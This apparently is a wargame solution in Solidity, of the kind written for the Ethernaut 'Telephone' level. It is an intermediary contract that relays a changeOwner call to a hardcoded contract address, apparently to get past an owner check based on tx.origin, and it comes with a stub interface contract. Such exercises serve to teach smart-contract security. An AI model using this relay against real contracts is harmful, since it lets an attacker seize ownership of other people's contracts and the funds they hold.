// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ITelephone} from "./interface/IChangeOwner.sol";

contract ChangeOwner {
    address public telephone_contract;
    ITelephone public TelephoneContract;

    constructor() {
        telephone_contract = 0x4e233dc317F6c1e7E726f4e86F7fC3b801110539;
        TelephoneContract = ITelephone(telephone_contract);
    }

    function changeOwner(address newOwner) public {
        TelephoneContract.changeOwner(newOwner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ITelephone {
    function changeOwner(address _owner) public {}
}